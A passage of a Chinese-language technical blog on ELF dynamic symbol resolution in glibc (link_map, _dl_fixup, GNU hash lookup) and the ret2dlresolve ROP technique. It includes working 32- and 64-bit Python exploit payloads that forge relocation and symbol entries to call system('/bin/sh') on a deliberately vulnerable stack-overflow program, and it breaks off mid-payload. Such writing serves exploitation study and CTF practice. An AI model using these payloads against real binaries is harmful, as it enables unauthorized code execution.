<code>p_offset</code> 的结果就是 <code>.dynamic</code> 的地址。其中的 <code>union</code> 里用 <code>d_val</code> 还是 <code>d_ptr</code> 取决于 <code>d_tag</code>（<code>DT_xxx</code>）：</p><pre><code class="cpp">/* Dynamic section entry.  */typedef struct{  Elf32_Sword        d_tag;                        /* Dynamic entry type */  union    {      Elf32_Word d_val;                        /* Integer value */      Elf32_Addr d_ptr;                        /* Address value */    } d_un;} Elf32_Dyn;typedef struct{  Elf64_Sxword        d_tag;                        /* Dynamic entry type */  union    {      Elf64_Xword d_val;                /* Integer value */      Elf64_Addr d_ptr;                        /* Address value */    } d_un;} Elf64_Dyn;</code></pre><h4 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a><code>.dynsym</code></h4><p><code>.dynsym</code> 是 <code>.dynamic</code> 中 <code>d_tag</code> 为 <code>DT_SYMTAB</code> 的 entry，<code>d_ptr</code> 指向 <code>.dynsym</code> Section（<code>Elf64_Sym</code> 或 <code>Elf32_Sym</code> 数组）。其中 <code>st_name</code> 指向 Symbol Name：</p><pre><code class="cpp">/* Symbol table entry.  */typedef struct{  Elf32_Word        st_name;                /* Symbol name (string tbl index) */  Elf32_Addr        st_value;                /* Symbol value */  Elf32_Word        st_size;                /* Symbol size */  unsigned char        st_info;                /* Symbol type and binding */  unsigned char        st_other;                /* Symbol visibility */  Elf32_Section        st_shndx;                /* Section index */} Elf32_Sym;typedef struct{  Elf64_Word        st_name;                /* Symbol name (string tbl index) */  unsigned char        st_info;                /* Symbol type and binding */  unsigned char st_other;                /* Symbol visibility */  Elf64_Section        st_shndx;                /* Section index */  Elf64_Addr        st_value;                /* Symbol value */  Elf64_Xword        st_size;                /* Symbol size */} Elf64_Sym;</code></pre><h4 id="dynstr"><a href="#dynstr" class="headerlink" title=".dynstr"></a><code>.dynstr</code></h4><p><code>.dynstr</code> 是 <code>.dynamic</code> 中 <code>d_tag</code> 为 <code>DT_STRTAB</code> 的 entry，是 <code>.dynsym</code> 中 <code>st_name</code> 对应的字符串表（<code>name = (char *)(.dynstr+.dynsym[xx]-&gt;st_name)</code>）。</p><h4 id="rel-plt（-rela-plt）"><a href="#rel-plt（-rela-plt）" class="headerlink" title=".rel.plt（.rela.plt）"></a><code>.rel.plt</code>（<code>.rela.plt</code>）</h4><p><code>.rel.plt</code>（<code>.rela.plt</code>）是 <code>.dynamic</code> 中 <code>d_tag</code> 为 <code>DT_JMPREL</code> 的 entry，对应的结构体是 <code>Elf64_Rela</code>（<code>Elf32_Rel</code>）。<code>XX_Rela</code> 相比 <code>XX_Rel</code> 多了一个没什么用处的 <code>r_addend</code>，测试的时候发现 32 位程序用的是 <code>Elf32_Rel</code>，而 64 位程序用的是 <code>Elf64_Rela</code>。<code>r_offset</code> 为需要重定位的地址的偏移，即 <code>.got.plt</code>（GOT）；<code>r_info</code> 中包含 Symbol Index（Symbol Index 即为 <code>.dynsym</code> 中的 Section Index）。<code>ELF64_R_SYM</code>（<code>#define ELF64_R_SYM(i) ((i) &gt;&gt; 32)</code>）用来取高 32bit；<code>ELF32_R_SYM</code>（<code>#define ELF32_R_SYM(val) ((val) &gt;&gt; 8)</code>）用来取高 24bit：</p><pre><code class="cpp">/* Relocation table entry without addend (in section of type SHT_REL).  */typedef struct{  Elf32_Addr        r_offset;                /* Address */  Elf32_Word        r_info;                        /* Relocation type and symbol index */} Elf32_Rel;/* I have seen two different definitions of the Elf64_Rel and   Elf64_Rela structures, so we&#39;ll leave them out until Novell (or   whoever) gets their act together.  *//* The following, at least, is used on Sparc v9, MIPS, and Alpha.  */typedef struct{  Elf64_Addr        r_offset;                /* Address */  Elf64_Xword        r_info;                        /* Relocation type and symbol index */} Elf64_Rel;/* Relocation table entry with addend (in section of type SHT_RELA).  */typedef struct{  Elf32_Addr        r_offset;                /* Address */  Elf32_Word        r_info;                        /* Relocation type and symbol index */  Elf32_Sword        r_addend;                /* Addend */} Elf32_Rela;typedef struct{  Elf64_Addr        r_offset;                /* Address */  Elf64_Xword        r_info;                        /* Relocation type and symbol index */  Elf64_Sxword        r_addend;                /* Addend */} Elf64_Rela;</code></pre><h2 id="Symbol-Resolve"><a href="#Symbol-Resolve" class="headerlink" title="Symbol Resolve"></a>Symbol Resolve</h2><p>接下来看程序是怎么解 Symbol 的。在 Symbol 还没有没解析好的时候，PLT 中的第一条指令会 JMP 到 GOT，而 GOT 原本的值是 PLT 中的第二条指令（<code>XX@plt+6</code>）；第二条指令 <code>PUSH reloc_arg</code>（如果用 <code>.rel.plt</code> 则 <code>reloc_arg</code> 是 <code>offset</code>；如果是 <code>rela.plt.</code> 则是 <code>index</code>）；第三条指令 JMP 至 PLT 中的第一行（<code>PLT0</code>）。</p><p>接下来在 <code>PLT0</code> 中，第一条指令 <code>PUSH GOT1</code> 把 <code>link_map</code> 结构体入栈（64 位在调用 <code>_dl_fixup()</code> 之前会把栈上的 <code>link_map</code> 和 <code>reloc_arg</code> 分别复制给 rdi 和 rsi）；第二条指令 <code>JMP GOT2</code> 来跳转到 Dynamic Resolver 来寻找 Symbol（即跳转到 <code>_dl_runtime_resolve()</code>）</p><h3 id="dl-runtime-resolve"><a href="#dl-runtime-resolve" class="headerlink" title="_dl_runtime_resolve()"></a><code>_dl_runtime_resolve()</code></h3><p><code>_dl_runtime_resolve()</code> 函数是 Symbol 的解析器，它将 <code>link_map</code> 和 <code>reloc_arg</code> 作为参数传入 <code>_dl_fixup()</code>，并在 <code>_dl_fixup()</code> 中获取 Symbol Name，在 Library 中找到对应的地址并填入 GOT。解析成功后，程序会直接跳转到解出的函数地址。</p><p>Resolver 先根据 reloc_arg 定位到 <code>.rel.plt</code>（<code>.rela.plt</code>），然后根据 <code>r_info</code> 找到对应的 Symbol Name，并获取在 Library 中的地址，然后根据 <code>r_offset</code> 找到 GOT，并将获得的地址填入 GOT。查找函数的过程如下：</p><pre><code>_dl_runtime_resolve(link_map, reloc_arg)            __________            |           |Elf64_Rela| &lt;---------+           |----------|      +--- | r_offset |         ___________      |    |  r_info  | -----&gt; | Elf64_Sym |          ____________      |    |__________|        |-----------|         |            |      |                        |  st_name  | ------&gt; | printf\x00 |      |      .rel.plt          |___________|         |____________|      v  __________                     .dynsym                .dynstr |          | | &lt;printf&gt; | |__________|   .got.plt</code></pre><p>其中 <code>link_map</code> 中包括了所有已加载的 ELF 信息。</p><h4 id="link-map"><a href="#link-map" class="headerlink" title="link_map"></a><code>link_map</code></h4><p><code>link_map</code> 结构体在 <a href="https://code.woboq.org/userspace/glibc/include/link.h.html" target="_blank" rel="noopener"><code>glibc/include/link.h</code></a> 中实现。其中，<code>l_next</code> 作为指针连接所有载入的 Library；<code>l_name</code> 存储了 Library 的名字；<code>l_addr</code> 中存储了该 Library 的基址；<code>l_info[x]</code> 则指向 <code>.dynamic</code> 中的数据，<code>x</code> 即为 <code>d_tag</code>，可以用来获取 Library 中的指定 Section：</p><pre><code class="cpp">/* Structure describing a loaded shared object.  The `l_next&#39; and `l_prev&#39;   members form a chain of all the shared objects loaded at startup.   These data structures exist in space used by the run-time dynamic linker;   modifying them may have disastrous results.   This data structure might change in future, if necessary.  User-level   programs must avoid defining objects of this type.  */struct link_map  {    /* These first few members are part of the protocol with the debugger.       This is the same format used in SVR4.  */    ElfW(Addr) l_addr;                /* Difference between the address in the ELF                                   file and the addresses in memory.  */    char *l_name;                /* Absolute file name object was found in.  */    ElfW(Dyn) *l_ld;                /* Dynamic section of the shared object.  */    struct link_map *l_next, *l_prev; /* Chain of loaded objects.  */    /* All following members are internal to the dynamic linker.       They may change without notice.  */    /* This is an element which is only ever different from a pointer to       the very same copy of this type for ld.so when it is used in more       than one namespace.  */    struct link_map *l_real;    /* Number of the namespace this link map belongs to.  */    Lmid_t l_ns;    struct libname_list *l_libname;    /* Indexed pointers to dynamic section.       [0,DT_NUM) are indexed by the processor-independent tags.       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are       indexed by DT_VERSIONTAGIDX(tagvalue).       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by       DT_EXTRATAGIDX(tagvalue).       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are       indexed by DT_VALTAGIDX(tagvalue) and       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,        DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM                      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];    const ElfW(Phdr) *l_phdr;        /* Pointer to program header table in core.  */    ElfW(Addr) l_entry;                /* Entry point location.  */    ElfW(Half) l_phnum;                /* Number of program header entries.  */    ElfW(Half) l_ldnum;                /* Number of dynamic segment entries.  */    ...    /* Pointer to the version information if available.  */    ElfW(Versym) *l_versyms;    ...  };</code></pre><h4 id="dl-fixup"><a href="#dl-fixup" class="headerlink" title="_dl_fixup()"></a><code>_dl_fixup()</code></h4><p><code>_dl_fixup()</code> 在 <a href="https://code.woboq.org/userspace/glibc/elf/dl-runtime.c.html" target="_blank" rel="noopener">dl-runtime.c</a> 中实现。通过 <code>reloc_arg</code> 在 <code>link_map</code> 中获取相应的 <code>symtab</code>（<code>.dynsym</code> 数组）、<code>strtab</code>（<code>.dynstr</code>）、<code>reloc</code>（<code>.rel.plt</code> 或 <code>.rela.plt</code>）、<code>sym</code>（根据 <code>reloc</code> 中的 <code>r_info</code> 得到对应的 <code>.dynsym</code> 元素）。然后会有一系列的检查，通过检查后根据 <code>strtab + sym-&gt;st_name</code> 的 Symbol Name 查找到对应的地址，最后填入 GOT：</p><pre><code class="cpp">/* This function is called through a special trampoline from the PLT the   first time each PLT entry is called.  We must perform the relocation   specified in the PLT of the given shared object, and return the resolved   function address to the trampoline, which will restart the original call   to that address.  Future calls will bounce directly from the PLT to the   function.  */DL_FIXUP_VALUE_TYPE__attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE_dl_fixup (# ifdef ELF_MACHINE_RUNTIME_FIXUP_ARGS       ELF_MACHINE_RUNTIME_FIXUP_ARGS,# endif       struct link_map *l, ElfW(Word) reloc_arg){  const ElfW(Sym) *const symtab    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);  // 通过reloc_arg计算重定位入口，JMPREL即.rel.plt，reloc_offset在32位下为reloc_arg（64位下为reloc_arg * sizeof (PLTREL)）  const PLTREL *const reloc    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);  // 通过reloc-&gt;r_info找到.dynsym中对应的部分  const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];  void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);  lookup_t result;  DL_FIXUP_VALUE_TYPE value;  // 检查reloc-&gt;r_info的最低位是不是ELF_MACHINE_JMP_SLOT（7，表示这是一个PLT）  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);  // 检查version  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)    {      const struct r_found_version *version = NULL;      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)    {      const ElfW(Half) *vernum =        (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);      ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;      version = &amp;l-&gt;l_versions[ndx];      if (version-&gt;hash == 0)        version = NULL;    }      /* We need to keep the scope around so do some locking.  This is     not necessary for objects which cannot be unloaded or when     we are not using any threads (yet).  */      int flags = DL_LOOKUP_ADD_DEPENDENCY;      if (!RTLD_SINGLE_THREAD_P)    {      THREAD_GSCOPE_SET_FLAG ();      flags |= DL_LOOKUP_GSCOPE_LOCK;    }#ifdef RTLD_ENABLE_FOREIGN_CALL      RTLD_ENABLE_FOREIGN_CALL;#endif      // 通过strtab + sym-&gt;st_name找到符号表字符串，result为libc基地址      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);      /* We are done with the global scope.  */      if (!RTLD_SINGLE_THREAD_P)    THREAD_GSCOPE_RESET_FLAG ();#ifdef RTLD_FINALIZE_FOREIGN_CALL      RTLD_FINALIZE_FOREIGN_CALL;#endif      // 找到了对应的.dynsym后，Library基址加上st_value的结果即为函数地址      value = DL_FIXUP_MAKE_VALUE (result,                   sym ? (LOOKUP_VALUE_ADDRESS (result)                      + sym-&gt;st_value) : 0);    }  else    {      // 如果Symbol已经找到了      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);      result = l;    }  // value为libc基址加上要解析函数的偏移地址，即实际地址  value = elf_machine_plt_value (l, reloc, value);  if (sym != NULL      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));  /* Finally, fix up the plt itself.  */  if (__builtin_expect (GLRO(dl_bind_not), 0))    return value;  // 把value写入对应的GOT中  return elf_machine_fixup_plt (l, result, reloc, rel_addr, value);}</code></pre><h5 id="dl-lookup-symbol-x-（-dl-lookup-x-）"><a href="#dl-lookup-symbol-x-（-dl-lookup-x-）" class="headerlink" title="_dl_lookup_symbol_x()（_dl_lookup_x()）"></a><code>_dl_lookup_symbol_x()</code>（<code>_dl_lookup_x()</code>）</h5><p><code>_dl_lookup_symbol_x()</code> 以及 <code>_dl_lookup_x()</code> 在 <a href="https://code.woboq.org/userspace/glibc/elf/dl-lookup.c.html" target="_blank" rel="noopener"><code>glibc/elf/dl-look-up.c</code></a> 中实现。其中根据 <code>strtab + sym-&gt;st_name</code> 来查找符号表。理论上可以通过遍历 <code>.dynsym</code> 中的每个元素的 <code>st_name</code> 来获取 <code>.dynstr</code> 中对应的字符串，并和传入的 Symbol Name 进行比较，但这样的时间复杂度就会很高。<code>_dl_lookup_symbol_x()</code> 中则通过哈希表（GNU Hash）来进行查找：</p><pre><code class="cpp">static uint_fast32_tdl_new_hash (const char *s){  uint_fast32_t h = 5381;  for (unsigned char c = *s; c != &#39;\0&#39;; c = *++s)    h = h * 33 + c;  return h &amp; 0xffffffff;}</code></pre><p>可以用 Python 实现这个函数：</p><pre><code class="python">In [1]: def dl_new_hash(s):   ...:   h = 5381   ...:   for c in s:   ...:     h = 33 * h + ord(c)   ...:   return h &amp; 0xffffffff   ...:In [2]: hex(dl_new_hash(&#39;__isoc99_scanf&#39;))Out[2]: &#39;0xeafe348dL&#39;</code></pre><p><code>_dl_lookup_symbol_x()</code> 中，先会调用 <code>dl_new_hash()</code> 来计算 Symbol Name 的哈希值，然后调用 <code>do_lookup_x()</code> 来查找对应的 Symbol：</p><pre><code class="cpp">/* Search loaded objects&#39; symbol tables for a definition of the symbol   UNDEF_NAME, perhaps with a requested version for the symbol.   We must never have calls to the audit functions inside this function   or in any function which gets called.  If this would happen the audit   code might create a thread which can throw off all the scope locking.  */lookup_tinternal_function_dl_lookup_symbol_x (const char *undef_name, struct link_map *undef_map,             const ElfW(Sym) **ref,             struct r_scope_elem *symbol_scope[],             const struct r_found_version *version,             int type_class, int flags, struct link_map *skip_map){  const uint_fast32_t new_hash = dl_new_hash (undef_name); // 获取Symbol Name的哈希  unsigned long int old_hash = 0xffffffff;  struct sym_val current_value = { NULL, NULL };  struct r_scope_elem **scope = symbol_scope;  ...  /* Search the relevant loaded objects for a definition.  */  for (size_t start = i; *scope != NULL; start = 0, ++scope)    {      int res = do_lookup_x (undef_name, new_hash, &amp;old_hash, *ref,                 &amp;current_value, *scope, start, version, flags,                 skip_map, type_class, undef_map);      if (res &gt; 0)    break;  ...  *ref = current_value.s;  return LOOKUP_VALUE (current_value.m);}</code></pre><p>在 <code>do_lookup_x()</code> 中有一个大循环，主要是根据 Symbol Name 的哈希值模 <code>l_nbuckets</code> 作为下标，从 <code>l_gnu_buckets</code> 中获取一个 <code>bucket</code>。然后根据 bucket 从 <code>l_gnu_chain_zero</code> 取出一个哈希值来进行比较，如果正确，那么当前的 <code>bucket</code> 的值就是目标 <code>.dynsym</code> 的下标；如果不正确，将 <code>bucket</code> 的值加 1。最后返回 Symbol Name 对应的 <code>.dynsym</code>：</p><pre><code class="cpp">/* Inner part of the lookup functions.  We return a value &gt; 0 if we   found the symbol, the value 0 if nothing is found and &lt; 0 if   something bad happened.  */static int__attribute_noinline__do_lookup_x (const char *undef_name, uint_fast32_t new_hash,         unsigned long int *old_hash, const ElfW(Sym) *ref,         struct sym_val *result, struct r_scope_elem *scope, size_t i,         const struct r_found_version *const version, int flags,         struct link_map *skip, int type_class, struct link_map *undef_map){  size_t n = scope-&gt;r_nlist;  /* Make sure we read the value before proceeding.  Otherwise we     might use r_list pointing to the initial scope and r_nlist being     the value after a resize.  That is the only path in dl-open.c not     protected by GSCOPE.  A read barrier here might be to expensive.  */  __asm volatile (&quot;&quot; : &quot;+r&quot; (n), &quot;+m&quot; (scope-&gt;r_list));  struct link_map **list = scope-&gt;r_list;  do    {  ...      /* The tables for this map.  */      const ElfW(Sym) *symtab = (const void *) D_PTR (map, l_info[DT_SYMTAB]);      const char *strtab = (const void *) D_PTR (map, l_info[DT_STRTAB]);  ...      if (__builtin_expect (bitmask != NULL, 1))    {      ElfW(Addr) bitmask_word        = bitmask[(new_hash / __ELF_NATIVE_CLASS)              &amp; map-&gt;l_gnu_bitmask_idxbits];      unsigned int hashbit1 = new_hash &amp; (__ELF_NATIVE_CLASS - 1);      unsigned int hashbit2 = ((new_hash &gt;&gt; map-&gt;l_gnu_shift)                   &amp; (__ELF_NATIVE_CLASS - 1));      if (__builtin_expect ((bitmask_word &gt;&gt; hashbit1)                &amp; (bitmask_word &gt;&gt; hashbit2) &amp; 1, 0))        {        // 从l_gnu_buckets中获取一个bucket          Elf32_Word bucket = map-&gt;l_gnu_buckets[new_hash                             % map-&gt;l_nbuckets];          if (bucket != 0)        {      // 从l_gnu_chain_zero取出一个哈希值          const Elf32_Word *hasharr = &amp;map-&gt;l_gnu_chain_zero[bucket];          do            if (((*hasharr ^ new_hash) &gt;&gt; 1) == 0) // 比较哈希值              {            symidx = hasharr - map-&gt;l_gnu_chain_zero;            sym = check_match (&amp;symtab[symidx]);            if (sym != NULL)              goto found_it;              }          while ((*hasharr++ &amp; 1u) == 0);        }        }      /* No symbol found.  */      symidx = SHN_UNDEF;    }  ...    }  /* We have not found anything until now.  */  return 0;}</code></pre><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>根据上面的分析，基本上可以得出 Dynamic Resolver 进行解析 Symbol 的过程：</p><ul><li>根据 <code>reloc_arg</code> 加载 Symbol Name</li><li>根据 <code>link_map</code> 中依次在每个 Library 中找 Symbol</li><li>计算 Symbol 的 Hash</li><li>用 Bloom Filter 检查 Symbol 是否存在（不是很重要）</li><li>在 Hash Bucket 和 Chain 中找 Symbol，若 <code>st_name</code> 符合则找到</li><li>检查 <code>version</code> 是否正确（不太重要）</li><li>填写 GOT 并回传 Symbol 的地址</li></ul><p>而 DynELF 的功能其实就是在干 Dynamic Resolver 的工作，它没有采用 GNU Hash 的方法来查找，而是使用了一个一个找 <code>.dynsym</code> 的方式来定位想要的函数。</p><h1 id="Return-to-Dynamic-Resolver"><a href="#Return-to-Dynamic-Resolver" class="headerlink" title="Return to Dynamic Resolver"></a>Return to Dynamic Resolver</h1><p>一种根据 Dynamic Resolver 的工作原理来实现的 ROP 技术。通过构造传给 <code>_dl_runtime_resolve</code> 的参数，让 <code>_dl_fixup</code> 解析出我们要的 Symbol：</p><ul><li>参数通过栈传递，x86 和 x64 都可以使用</li><li>可以直接 CALL PLT0，这样就只需要传 <code>reloc_arg</code></li><li>需要控制 <code>link_map</code> 的时候可以 JMP PLT0 的第二条指令</li><li>不需要泄漏信息和 libc 版本，百分之百稳定 get shell</li></ul><h2 id="What-is-RELRO"><a href="#What-is-RELRO" class="headerlink" title="What is RELRO"></a>What is RELRO</h2><p>Relocation Read Only（RELRO）保护有不同等级，利用的方法和复杂程度不同：</p><ul><li>No RELRO：所有相关的数据部分都能写</li><li>Partial RELRO（gcc 默认设定的值）：<code>.dynamic</code>、<code>.dynsym</code>、<code>.dynstr</code> 等部分只读</li><li>Full RELRO：所有的 Symbol 在加载时都解析完成，GOT 只读，没有 <code>link_map</code> 和 Dynamic Resolver 的指针可以利用</li></ul><p>下面根据三种情况分析不同的攻击方法。程序源码如下：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;char buf[1000000];int main() {    char local[10];//    write(1, &quot;&gt; &quot;, 2); // 32位下可以在没有泄漏的情况下实现，64位下可能需要泄漏    int len = read(0, buf, sizeof(buf));    memcpy(local, buf, len);    return 0;}</code></pre><h2 id="No-RELRO"><a href="#No-RELRO" class="headerlink" title="No RELRO"></a>No RELRO</h2><p>直接伪造 <code>.dynstr</code>，通过 <code>readelf</code> 找到 <code>.dynamic</code> 中 <code>DT_STRTAB</code> 的位置，把原本的 <code>.dynstr</code> 指向可控制的内存（在上面放 <code>&quot;system\x00&quot;</code>），然后跳到一个还没有解析过的 Symbol 上，如 <code>__gmon_start__</code>。这种方法只能在 No RELRO 的情况下使用。32 位下可以构造如下 payload：</p><pre><code class="python">def memcpy(dst, src, length):    return p32(memcpy_plt) + p32(pop3_ret) + p32(dst) + p32(src) + p32(length)st_name = 0x38payload = (    ((        &#39;A&#39; * 18 + # padding        p32(buf + 1024 + 4) # set esp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(dynstr_addr + 4, buf + 2048, 4) +        p32(gmon_start_plt) +        p32(0xdeadbeef) +        p32(buf + 2048 + 12) # &amp;&quot;/bin/sh\x00&quot;    ).ljust(2048, &#39;\x00&#39;) +  # buf+2048    p32(buf + 2048 + 4 - st_name) + # set strtab=&amp;&quot;system\x00&quot;    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><p>64 位下同理：</p><pre><code class="python">def csu(func, rdi, rsi, rdx):  payload = (        p64(0x40066a) + p64(0) + p64(1) + p64(func) + p64(rdx) + p64(rsi) + p64(rdi) +        p64(0x400650) + 56 * &#39;\x00&#39;  )  return payloaddef memcpy(dst, src, length):    return csu(memcpy_got, dst, src, length)payload = (    ((        &#39;A&#39; * 14 + # padding        p64(buf + 1024 - 8) + # set rbp=buf+1024-8        p64(leave_ret) # stack pivot ; set rsp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(dynstr_addr + 8, buf + 2048, 8) +        p64(pop_rdi_ret) +        p64(buf + 2048 + 16) +        p64(gmon_start_plt)    ).ljust(2048, &#39;\x00&#39;) + # buf+2048    p64(buf + 2048 + 8 - st_name) + # set strtab=&amp;&quot;system\x00&quot;    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><h2 id="Partial-RELRO"><a href="#Partial-RELRO" class="headerlink" title="Partial RELRO"></a>Partial RELRO</h2><p>构造一个假的 <code>Elf32_Rel</code>（<code>Elf64_Rela</code>），使 <code>r_offset</code> 在可写位置，<code>r_info</code> 使 <code>&amp;.dynsym[r_info&gt;&gt;8]</code>（64 位下是 <code>&amp;.dynsym[r_info&gt;&gt;32]</code>）可控。然后传一个特别大的 <code>reloc_arg</code> 进去，使 <code>.rel.plt+reloc_arg</code> 落在假的 <code>Elf32_Rel</code>（<code>Elf64_Rela</code>）上。接着构造一个假的 <code>Elf32_Sym</code>（<code>Elf64_Sym</code>），其中构造 <code>st_name</code> 使 <code>.dynstr+st_name</code> 可控（放上 <code>&quot;system\x00&quot;</code>）</p><p>如果可控的内存地址和 Section 相反或距离太远而无法使用（基本上 64 位会有这个问题），需要让 <code>reloc_arg</code>、<code>r_info</code>、<code>st_name</code> 的参数可以放进这块内存。其中 <code>.gnu.version[r_info&gt;&gt;8]</code> 要为 0，或者把 <code>l_info[VERSYMIDX (DT_VERSYM)]</code> 中的内容清空。由于我们构造的伪 Symbol 中的 <code>r_info</code> 过大，使得 <code>vernum[ELFW(R_SYM) (reloc-&gt;r_info)]</code> 读取出错，如果 <code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)]</code> 的值为 NULL 就不会出错，如下：</p><pre><code class="cpp">      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)        {          const ElfW(Half) *vernum =            (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);          ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;          version = &amp;l-&gt;l_versions[ndx];          if (version-&gt;hash == 0)            version = NULL;        }</code></pre><p>32 位下可以构造如下 payload：</p><pre><code class="python">payload = (    ((        &#39;A&#39; * 18 + # padding        p32(buf + 1024 + 4) # set esp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        p32(plt0) +        p32(buf + 2048 - relplt) + # set reloc_arg=buf+2048        p32(0xdeadbeef) +        p32(buf + 2048 + 36)    ).ljust(2048, &#39;\x00&#39;) + # buf+2048    # Elf32_Rel    p32(buf) + # r_offset    p32(0x7 | (((buf + 2048 + 8 + 4 - dynsym) / 16) &lt;&lt; 8)) + # r_info    p32(0) + # padding    # Elf32_Sym &lt;= buf+2048+12    p32(buf + 2048 + 28 - dynstr) + # st_name    p32(0) + # st_value    p32(0) + # st_size    p32(0x12) + # st_info    # buf+2048+28    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><p>64 位有一些地方不太一样，比如说结构体的大小等，其中 <code>reloc_arg</code> 的宏定义也和 32 位不同，上文也提到了。不过 <code>Elf64_Sym</code> 结构体的大小还是跟 32 位下的 <code>Elf32_Sym</code> 一样，只是几个变量的顺序有所改变，需要修改。同时，64 位下会产生上面提到的 Segmentation Fault。由于 64 位的 Function Call 用的是 <code>__libc_csu_init</code> 中的通用 Gadget，设置第一个参数 rdi 时只能传低 32 位，所以导致不能直接 <code>memcpy</code> 到 <code>link_map</code> 上来改 <code>l-&gt;l_info[VERSYMIDX (DT_VERSYM)]</code>，所以借助了 <code>read</code> 和 <code>write</code> 来实现：</p><pre><code class="python">reloc_arg = (buf + 2048 + 16 - relplt) / 24payload = (    ((        &#39;A&#39; * 14 + # padding        p64(buf + 1024 - 8) + # set rbp=buf+1024-8        p64(leave_ret) # stack pivot ; set rsp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(buf + 1024 + 160, got1, 8) + # buf+1024+120        write(1, 0, 0x1c8+8) + # buf+1024+240        memcpy(buf + 1024 + 400, got1, 8) + # buf+1024+360        read(0, 0, 0x1c8+8) + # buf+1024+480 ; l-&gt;l_info[VERSYMIDX (DT_VERSYM)]=NULL        p64(pop_rdi_ret) +        p64(buf + 2048 + 56) +        p64(plt0) +        p64(reloc_arg) # set reloc_arg    ).ljust(2048, &#39;\x00&#39;) +  # buf+2048    16 * &#39;\x00&#39; + # padding    # Elf64_Rela    p64(buf) + # r_offset    p64(0x7 | (((buf + 2048 + 32 - dynsym) / 24) &lt;&lt; 32)) + # r_info    # Elf64_Sym &lt;= buf+2048+32    p32(buf + 2048 + 48 - dynstr) + # st_name    p32(0x12) + # st_info    p32(0) +    p32(0) +    # buf+2048+48    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><p>Partial RELRO 的第二种方法是直接修改 <code>link_map</code>，将 <code>l_info[DT_STRTAB]</code> 指向构造出来的 <code>Elf32_Dyn</code>（<code>Elf64_Dyn</code>）来伪造 <code>.dynstr</code>。然后呼叫 <code>__gmon_start__</code> 并在对应 <code>st_name</code> 的地址处放上 <code>&quot;system\x00&quot;</code>。不过需要有特定的 Gadget 才有办法在不能泄漏的情况下使 <code>*(*(pointer)+offset)=value</code>。32 位下构造如下 payload：</p><pre><code class="python">def memcpy(dst, src, length):    return p32(memcpy_plt) + p32(pop3_ret) + p32(dst) + p32(src) + p32(length)payload = (    ((        &#39;A&#39; * 18 + # padding        p32(buf + 1024 + 4) # set esp=buf+1024    ).ljust(1024, &#39;\x00&#39;) + # buf+1024        memcpy(buf + 1024 + 32, got1, 4) + # buf+1024+20        memcpy(buf, 0, 56) + # buf+1024+40        memcpy(buf + 52, buf + 2048, 4) + # buf+1024+60        memcpy(buf + 1024 + 88, got1, 4) + # buf+1024+80        memcpy(0, buf, 56) + # buf+1024+100        p32(gmon_start_plt) + p32(0xdeadbeef) + p32(buf + 2048 + 20)    ).ljust(2048, &#39;\x00&#39;) + # buf+2048    p32(buf + 2048 + 4) +    p32(5) +    p32(buf + 2048 + 12 - st_name) +    # buf+2048+12    &#39;system\x00\x00&#39; +    &#39;/bin/sh\x00&#39;)</code></pre><p>64 位下对 <code>link_map</code> 的修改同样借助了泄漏来实现：</p><pre><code class="python">payload = (    ((        &#39;A&#39; * 14 + # padding        p64(buf + 1024 - 8) + # set rbp=buf+1024-8        p64(leave_ret) # stack pivot ; set rsp=buf+1024    